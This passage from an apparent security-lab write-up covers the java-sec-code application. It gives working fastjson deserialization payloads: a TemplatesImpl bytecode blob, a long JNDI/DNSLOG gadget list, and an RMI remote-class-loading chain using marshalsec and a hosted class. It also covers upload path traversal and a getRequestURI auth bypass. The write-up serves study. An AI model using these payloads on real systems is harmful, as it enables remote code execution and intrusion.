\&quot;_bytecodes\&quot;: [\&quot;yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk&#x2F;OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ&#x3D;&#x3D;\&quot;], \&quot;_name\&quot;: \&quot;lightless\&quot;, \&quot;_tfactory\&quot;: &#123; &#125;, \&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用parseObject 来解析json字符串</p>
<p>用POST方法打开，Content-Type设置为application/json，暴露使用的fastjson:</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164036838.png" alt="image-20210927164036838"></p>
<h3 id="使用DNSLOG验证"><a href="#使用DNSLOG验证" class="headerlink" title="使用DNSLOG验证"></a>使用DNSLOG验证</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;asText&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;,&quot;Object&quot;:&quot;a&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164811478.png" alt="image-20210927164811478"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164834250.png" alt="image-20210927164834250"></p>
<h3 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;touch&quot;, &quot;&#x2F;tmp&#x2F;success&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>编译代码,上传至服务器，我在本地使用Python http.server 进行搭建</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac TouchFile.java          &#x2F;&#x2F;进行编译</span><br><span class="line">python3 -m http.server 4444   &#x2F;&#x2F;简单搭建web服务</span><br></pre></td></tr></table></figure>

<p>借助<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;192.168.8.103&#x2F;#TouchFile 9999</span><br></pre></td></tr></table></figure>

<p>在显示监听后，在客户端发送请求payload，主要看创建文件是否成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.169.8.103:9999&#x2F;TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162052579.png" alt="image-20210928162052579"></p>
<p>发现已经访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;192.168.8.103:4444&#x2F;#TouchFile 9999</span><br><span class="line">* Opening JRMP listener on 9999</span><br><span class="line">Have connection from &#x2F;192.168.8.103:54177</span><br><span class="line">Reading message...</span><br><span class="line">Is RMI.lookup call for TouchFile 2</span><br><span class="line">Sending remote classloading stub targeting http:&#x2F;&#x2F;192.168.8.103:4444&#x2F;TouchFile.class</span><br><span class="line">Closing connection</span><br><span class="line"></span><br><span class="line">╰─$ python3 -m http.server 4444</span><br><span class="line">Serving HTTP on :: port 4444 (http:&#x2F;&#x2F;[::]:4444&#x2F;) ...</span><br><span class="line">::ffff:192.168.8.103 - - [28&#x2F;Sep&#x2F;2021 16:06:29] &quot;GET &#x2F;TouchFile.class HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure>

<p>查看文件</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162106468.png" alt="image-20210928162106468"></p>
<ol>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1274/">Fastjson 1.2.24 反序列化漏洞深度分析</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/issues/3077">发现最新版本1.2.67依然可以通过dnslog判断正确是否使用fastjson</a></li>
</ol>
<h2 id="9-FileUpload"><a href="#9-FileUpload" class="headerlink" title="9.FileUpload"></a>9.FileUpload</h2><p>对于文件上传来说，目前这类漏洞在spring里非常少，原因有两点：</p>
<ol>
<li>大多数公司上传的文件都会到cdn</li>
<li>spring的jsp文件必须在web-inf目录下才能执行</li>
</ol>
<p>除非，可以上传war包到tomcat的webapps目录。</p>
<p>正常上传代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@PostMapping(&quot;&#x2F;upload&quot;)</span><br><span class="line">public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,</span><br><span class="line">                               RedirectAttributes redirectAttributes) &#123;</span><br><span class="line">    if (file.isEmpty()) &#123;</span><br><span class="line">        &#x2F;&#x2F; 赋值给uploadStatus.html里的动态参数message</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);</span><br><span class="line">        return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">        byte[] bytes &#x3D; file.getBytes();</span><br><span class="line">        Path path &#x3D; Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;,</span><br><span class="line">                &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;status&quot;)</span><br><span class="line">public String uploadStatus() &#123;</span><br><span class="line">    return &quot;uploadStatus&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到没有对后缀名，MIME，文件内容等内容进行校验，可以任意上传。</p>
<p>对图片上传做限制后的代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@PostMapping(&quot;&#x2F;upload&#x2F;picture&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;</span><br><span class="line">        if (multifile.isEmpty()) &#123;</span><br><span class="line">            return &quot;Please select a file to upload&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String fileName &#x3D; multifile.getOriginalFilename();</span><br><span class="line">        String Suffix &#x3D; fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F; 获取文件后缀名</span><br><span class="line">        String mimeType &#x3D; multifile.getContentType(); &#x2F;&#x2F; 获取MIME类型</span><br><span class="line">        String filePath &#x3D; UPLOADED_FOLDER + fileName;</span><br><span class="line">        File excelFile &#x3D; convert(multifile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断文件后缀名是否在白名单内  校验1</span><br><span class="line">        String[] picSuffixList &#x3D; &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">        boolean suffixFlag &#x3D; false;</span><br><span class="line">        for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">            if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">                suffixFlag &#x3D; true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!suffixFlag) &#123;</span><br><span class="line">            logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断MIME类型是否在黑名单内 校验2</span><br><span class="line">        String[] mimeTypeBlackList &#x3D; &#123;</span><br><span class="line">                &quot;text&#x2F;html&quot;,</span><br><span class="line">                &quot;text&#x2F;javascript&quot;,</span><br><span class="line">                &quot;application&#x2F;javascript&quot;,</span><br><span class="line">                &quot;application&#x2F;ecmascript&quot;,</span><br><span class="line">                &quot;text&#x2F;xml&quot;,</span><br><span class="line">                &quot;application&#x2F;xml&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">            &#x2F;&#x2F; 用contains是为了防止text&#x2F;html;charset&#x3D;UTF-8绕过</span><br><span class="line">            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">                logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">                deleteFile(filePath);</span><br><span class="line">                return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断文件内容是否是图片 校验3</span><br><span class="line">        boolean isImageFlag &#x3D; isImage(excelFile);</span><br><span class="line">        deleteFile(randomFilePath);</span><br><span class="line"></span><br><span class="line">        if (!isImageFlag) &#123;</span><br><span class="line">            logger.error(&quot;[-] File is not Image&quot;);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">            byte[] bytes &#x3D; multifile.getBytes();</span><br><span class="line">            Path path &#x3D; Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">        return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void deleteFile(String filePath) &#123;</span><br><span class="line">        File delFile &#x3D; new File(filePath);</span><br><span class="line">        if(delFile.isFile() &amp;&amp; delFile.exists()) &#123;</span><br><span class="line">            if (delFile.delete()) &#123;</span><br><span class="line">                logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        logger.info(filePath + &quot; delete failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.对文件名做了白名单限制{“.jpg”, “.png”, “.jpeg”, “.gif”, “bmp”, “.ico”} 只允许对这些文件进行上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String[] picSuffixList &#x3D; &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">boolean suffixFlag &#x3D; false;</span><br><span class="line">for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">    if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">        suffixFlag &#x3D; true;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!suffixFlag) &#123;</span><br><span class="line">    logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">    deleteFile(filePath);</span><br><span class="line">    return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2.判断MIME类型是否在黑名单内 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;text&#x2F;html&quot;,</span><br><span class="line">&quot;text&#x2F;javascript&quot;,</span><br><span class="line">&quot;application&#x2F;javascript&quot;,</span><br><span class="line">&quot;application&#x2F;ecmascript&quot;,</span><br><span class="line">&quot;text&#x2F;xml&quot;,</span><br><span class="line">&quot;application&#x2F;xml&quot;</span><br></pre></td></tr></table></figure>

<p>3.使用contains为了防止text/html;charset=UTF-8绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">    logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">    deleteFile(filePath);</span><br><span class="line">    return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.使用IsImage()函数调用ImageIO.read()函数来检测内容是否为文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static boolean isImage(File file) throws IOException &#123;</span><br><span class="line">    BufferedImage bi &#x3D; ImageIO.read(file);</span><br><span class="line">    return bi !&#x3D; null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5.上传文件时会通过uuid生成一个’/tmp’ + uuid + ‘png’ 这样的文件名，然后最后删除掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">        byte[] bytes &#x3D; multifile.getBytes();</span><br><span class="line">        Path path &#x3D; Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">    logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">    return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private void deleteFile(String filePath) &#123;</span><br><span class="line">    File delFile &#x3D; new File(filePath);</span><br><span class="line">    if(delFile.isFile() &amp;&amp; delFile.exists()) &#123;</span><br><span class="line">        if (delFile.delete()) &#123;</span><br><span class="line">            logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(filePath + &quot; delete failed!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084805243.png" alt="image-20211026084805243"></p>
<p>存在未对文件名做校验，存在路径穿越漏洞，参数修改为<code>../../Users/oldthree/Documents/0.OL4THREE/0.Base/apache-tomcat-8.5.70/webapps/java_sec_code_war/1.png</code> 我们可以上传图片到任意目录，上传图片马不解析</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084911718.png" alt="image-20211026084911718"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">─ol4three ~&#x2F;Documents&#x2F;0.OL4THREE&#x2F;0.Base&#x2F;apache-tomcat-8.5.70&#x2F;webapps&#x2F;java_sec_code_war</span><br><span class="line">╰─$ ls</span><br><span class="line">1.png    META-INF WEB-INF</span><br></pre></td></tr></table></figure>

<p>直接进行访问即可</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026085048387.png" alt="image-20211026085048387"></p>
<p>由于会重新随机生成文件名未在检测中进行，导致上传jsp失败仍然会在/tmp目录下进行生成随机数生成的.jsp</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026092407832.png" alt="image-20211026092407832"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╭─ol4three &#x2F;tmp</span><br><span class="line">╰─$ ls</span><br><span class="line">06dc320d-35fb-11ec-937b-c91feee9eae9.jsp</span><br><span class="line">1989897e-35fb-11ec-937b-195f26ab9cc0.jsp</span><br><span class="line">2156c28f-35fb-11ec-937b-a71889553c3e.jsp</span><br></pre></td></tr></table></figure>

<p>使用文件上传any接口上传jsp文件解析利用如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091923728.png" alt="image-20211026091923728"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091850244.png" alt="image-20211026091850244"></p>
<h2 id="10-GetRequestURI"><a href="#10-GetRequestURI" class="headerlink" title="10.GetRequestURI"></a>10.GetRequestURI</h2><blockquote>
<p>当应用存在静态资源目录，比如<code>/css/</code>目录，在权限校验时一般会选择放行，即不校验权限。研发同学用<code>getRequestURI()</code>获取URI后，判断是否包含 <code>/css/</code>字符串，如果包含则不校验权限。此时如果URI为<code>/css/../hello</code>，用<code>getRequestURI()</code>获取的URI是<code>/css/../hello</code>，包含<code>/css/</code>字符串，所以不校验权限。但是此时后端的路由为<code>/hello</code>，导致权限绕过。</p>
</blockquote>
<p>核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(value &#x3D; &quot;&#x2F;exclued&#x2F;vuln&quot;)</span><br><span class="line">public String exclued(HttpServletRequest request) &#123;</span><br><span class="line"></span><br><span class="line">    String[] excluedPath &#x3D; &#123;&quot;&#x2F;css&#x2F;**&quot;, &quot;&#x2F;js&#x2F;**&quot;&#125;;</span><br><span class="line">    String uri &#x3D; request.getRequestURI(); &#x2F;&#x2F; Security: request.getServletPath()</span><br><span class="line">    PathMatcher matcher &#x3D; new AntPathMatcher();</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;getRequestURI: &quot; + uri);</span><br><span class="line">    logger.info(&quot;getServletPath: &quot; + request.getServletPath());</span><br><span class="line"></span><br><span class="line">    for (String path : excluedPath) &#123;</span><br><span class="line">        if (matcher.match(path, uri)) &#123;</span><br><span class="line">            return &quot;You have bypassed the login page.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;This is a login page &gt;..&lt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到判断包含/css/和/js/字符串如果包含则不进行校验权限</p>
<p>由于作者写的时候是使用根目录检测需要/css/..;/exclued/vuln 开头，可以修改网站根目录进行测试或者，手动调试修改代码</p>
<p>使用curl进行验证发现可以成功绕过return “You have bypasswd the login page.” </p>
